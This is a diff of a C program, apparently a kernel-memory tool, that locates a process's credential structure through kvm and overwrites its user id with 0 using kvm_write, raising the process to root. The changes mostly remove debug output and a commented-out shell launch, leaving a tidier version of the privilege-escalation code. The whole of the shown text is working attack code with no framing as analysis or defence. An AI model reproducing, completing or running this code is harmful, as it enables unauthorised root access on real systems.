@@ -1027,27 +1027,10 @@ int main(int argc, char **argv)
 		return(1);
 	}
 
-	for(i=0; nl[i].n_name; i++) {
-		printf("%s\n", nl[i].n_name);
-	}
-
-/*
-	if ((kp = kvm_getprocs(kd, KERN_PROC_PID, getpid(), &nentries)) == 0) {
-		perror("kvm_getprocs");
-		return(1);
-	}
-*/
-
-/*
-	printf("process is running under %d\n", kp[0].kp_eproc.e_ucred.cr_uid);
-*/
-
 	if(KREAD(kd, nl[X_ALLPROC].n_value, &p)) {
 		printf("Couldn't read allproc\n");
 		return(1);
 	}
-
-	printf("Allproc is %p\n", p);
 
 	if(KREAD(kd, (u_long)p, &proc)) {
 		printf("Can't read proc %p\n", p);
@@ -1059,26 +1042,18 @@ int main(int argc, char **argv)
 			return(1);
 		}
 
-	printf("I am %d on pid %d\n", getuid(), getpid());
-
-	printf("Got creditials for %d!!!! %p (%d)\n",
-		proc.p_pid, eproc.e_pcred, eproc.e_ucred.cr_uid);
-
 	o=offset((char *)&eproc.e_ucred,(char *)&eproc.e_ucred.cr_uid);
-	printf("Offset is %x\n", o);
 
+	/* UID to become */
 	eproc.e_ucred.cr_uid=0;
 
-	printf("Need to write to %p\n", eproc.e_pcred.pc_ucred+o);
+	/* printf("Need to write to %p\n", eproc.e_pcred.pc_ucred+o); */
 
-	if(kvm_write(kd, (u_long)eproc.e_pcred.pc_ucred+o, &eproc.e_ucred.cr_uid, 4) != 4) {
-		printf("Can't do the kvm_write\n");
+	if(kvm_write(kd, (u_long)eproc.e_pcred.pc_ucred+o,
+		&eproc.e_ucred.cr_uid, 4) != 4) {
+		printf("kvm_write failed\n");
 		return(1);
 	}
-
-	printf("I am %d on pid %d\n", getuid(), getpid());
-
-	/* system("/bin/sh"); */
 
 	return(0);
 }
